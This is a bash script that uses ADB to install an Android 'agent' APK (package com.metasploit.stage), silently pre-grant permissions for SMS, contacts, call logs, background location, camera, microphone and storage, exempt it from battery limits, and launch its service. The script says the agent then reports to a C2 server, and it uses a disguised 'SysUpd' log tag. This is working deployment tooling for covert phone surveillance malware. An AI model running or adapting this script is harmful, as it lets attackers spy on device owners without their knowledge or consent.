#!/usr/bin/env bash
# deploy_agent.sh — Install the Andro-DLS agent APK and pre-grant ALL
# runtime permissions via ADB (before first launch). This makes the agent
# fully operational from the moment it starts — no user permission prompts.
#
# Usage: ./deploy_agent.sh [apk_path] [device_serial]
#   apk_path     : path to the agent APK (default: androdls-agent.apk)
#   device_serial: ADB device serial (default: first connected device)

set -euo pipefail

APK="${1:-androdls-agent.apk}"
SERIAL="${2:-}"
PKG="com.metasploit.stage"

# Resolve device
if [ -z "$SERIAL" ]; then
    SERIAL=$(adb devices | grep -w 'device$' | head -1 | awk '{print $1}')
    [ -n "$SERIAL" ] || { echo "!! no device connected"; exit 1; }
    echo "[*] using device: $SERIAL"
fi

ADB="adb -s $SERIAL"

# Check APK exists
[ -f "$APK" ] || { echo "!! APK not found: $APK"; echo "   Run: ./build_agent_pure.sh <LHOST> <LPORT>"; exit 1; }

echo "[1/5] Installing APK..."
$ADB install -r -g "$APK" 2>&1 || {
    echo "[!] install failed, trying split-install fallback..."
    $ADB install-multiple "$APK" 2>&1 || exit 1
}

echo "[2/5] Force-stopping (to reset state)..."
$ADB shell am force-stop "$PKG" 2>/dev/null || true

echo "[3/5] Pre-granting runtime permissions (via pm grant)..."
# These are the permissions the agent declares. Pre-granting means the app
# never prompts the user — everything is already approved at first launch.
PERMS=(
    "android.permission.READ_SMS"
    "android.permission.SEND_SMS"
    "android.permission.READ_CONTACTS"
    "android.permission.READ_CALL_LOG"
    "android.permission.ACCESS_FINE_LOCATION"
    "android.permission.ACCESS_COARSE_LOCATION"
    "android.permission.ACCESS_BACKGROUND_LOCATION"
    "android.permission.CAMERA"
    "android.permission.RECORD_AUDIO"
    "android.permission.READ_PHONE_STATE"
    "android.permission.READ_EXTERNAL_STORAGE"
    "android.permission.WRITE_EXTERNAL_STORAGE"
    "android.permission.READ_MEDIA_IMAGES"
    "android.permission.READ_MEDIA_AUDIO"
    "android.permission.READ_MEDIA_VIDEO"
    "android.permission.POST_NOTIFICATIONS"
    "android.permission.SYSTEM_ALERT_WINDOW"
)

GRANTED=0
FAILED=0
for p in "${PERMS[@]}"; do
    if $ADB shell pm grant "$PKG" "$p" 2>/dev/null; then
        GRANTED=$((GRANTED + 1))
    else
        FAILED=$((FAILED + 1))
        echo "  [!] failed: $p"
    fi
done
echo "  granted=$GRANTED  failed=$FAILED"

echo "[4/5] Disabling battery optimization (whitelist)..."
$ADB shell dumpsys deviceidle whitelist +com.metasploit.stage 2>/dev/null || true

echo "[5/5] Launching agent..."
$ADB shell am start -n "$PKG/.DlsLauncher" 2>/dev/null || true
$ADB shell am startservice -n "$PKG/.DlsService" 2>/dev/null || true

echo ""
echo "Agent deployed and permissions pre-granted."
echo "  Package: $PKG"
echo "  Device:  $SERIAL"
echo ""
echo "Verify:"
echo "  $ADB shell ps | grep metasploit"
echo "  $ADB shell logcat -s SysUpd"
echo ""
echo "The agent will connect to the C2 server when network is available."
echo "Check the C2 listener for the __DLS_AGENT__ handshake."
